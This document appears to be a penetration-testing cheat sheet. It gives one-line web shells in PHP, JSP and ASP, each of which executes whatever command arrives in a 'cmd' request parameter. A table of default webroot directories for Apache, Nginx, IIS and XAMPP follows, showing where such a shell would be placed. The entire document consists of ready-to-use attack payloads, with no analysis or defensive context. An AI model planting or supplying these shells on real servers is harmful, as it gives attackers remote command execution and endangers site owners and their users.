## php\
```
<?php system($_REQUEST["cmd"]); ?>
```

## jsp
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## asp
```
<% eval request("cmd") %>
```

## Default webroots for common web servers:
|Web Server|Default Webroot|
|----------|---------------|
|Apache|/var/www/html/|
|Nginx|/usr/local/nginx/html/|
|IIS|c:\inetpub\wwwroot\|
|XAMPP|C:\xampp\htdocs\|